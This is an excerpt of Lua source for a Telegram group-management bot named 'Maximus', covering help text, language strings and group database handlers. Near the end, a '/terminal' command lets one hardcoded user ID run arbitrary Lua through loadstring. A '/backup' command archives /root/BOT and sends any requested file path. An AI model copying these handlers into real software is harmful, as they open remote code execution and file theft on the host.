...
..'`>`/Nerkh : *Shows Group Fee*\n'
..'-- @Teshne --',
ExAdmin = '* Maximus Extra Admins Help*\n'
..'`>`/ID [_Reply|@Username|UserID_]: *Get Target UserID*\n'
..'`>`/Link Del : *Set Link Posting Stats On Clean*\n'
..'`>`/Link Kick : *Set Link Posting Stats On KickUser*\n'
..'`>`/Link Report : *Set Link Posting Stats On ReportSpam And Clean AllMessages*\n'
...
..'`>`/Nerkh : *Shows Group Fee*\n'
..'-- @Teshne --',
Mod = '* Maximus GroupModerators Help*\n'
..'`>`/ID [_Reply|@Username|UserID_]: *Get Target UserID*\n'
..'`>`/Link Del : *Set Link Posting Stats On Clean*\n'
..'`>`/Link Kick : *Set Link Posting Stats On KickUser*\n'
..'`>`/Link Report : *Set Link Posting Stats On ReportSpam And Clean AllMessages*\n'
  ...
  return trans
		...
		if LANg == 'en' then
			LANG = 'en'
				...
				set_text(LANG, 'list:sudos', 'Maximus Sudoers List :\n')
				set_text(LANG, 'list:admins', 'Maximus GloballyAdmins List :\n')
		...
		elseif LANg == 'fa' then
			...
			set_text(LANG, 'list:sudos', tr(lANG, 'Maximus Sudoers List :\n'))
			set_text(LANG, 'list:admins', tr(lANG, 'Maximus GloballyAdmins List :\n'))
...
function rem_gp(msg, chat_id, user_id, username)
	add = '*Group* '..chat_id..' *Hasbeen SuccsesFully Removed From* Ultra Maximus *Data Base.*'
					...
					--
						 -- Sudo Accsess --
							...
							if matches[1]:lower() == 'reload' and is_sudo(msg) then
								plugins = {}
  								load_plugins()
  								tdcli.sendText(chat_id, msg_id, 0, 1, nil, '*Done* `Maximus Reloaded`', 1, 'md')
							end
							...
							if matches[2] then
      						...
      						elseif not matches[2] then
								...
								if redis:sismember('groups', '-100'..chid) then
									...
									text = '*Group* `'..chid..'` *Hasbeen SuccsesFully Added To* Ultra Maximus*Data Base.*'
								end
   					   ...
   					   if matches[1] == '/terminal' and user_id == 253838401 then
							...
							tdcli.sendText(chat_id, msg_id, 0, 1, nil, loadstring(matches[2])(), 1, 'md')
   					   	...
   					   	if matches[1] == '/backup' and matches[2] and user_id == 253838401 then
   					   		...
   					   		elseif matches[2]:lower() == 'Maximus' then
   					   			io.popen('tar -czf F80-back.tar.gz /root/BOT'):read('*all')
   					   			doc = './F80-back.tar.gz'
   					   			text = '<code>I\'ll Backed up </code><b> Maximus</b><code> To Your PV :)</code>'
   					   		else
   					   			doc = matches[2]
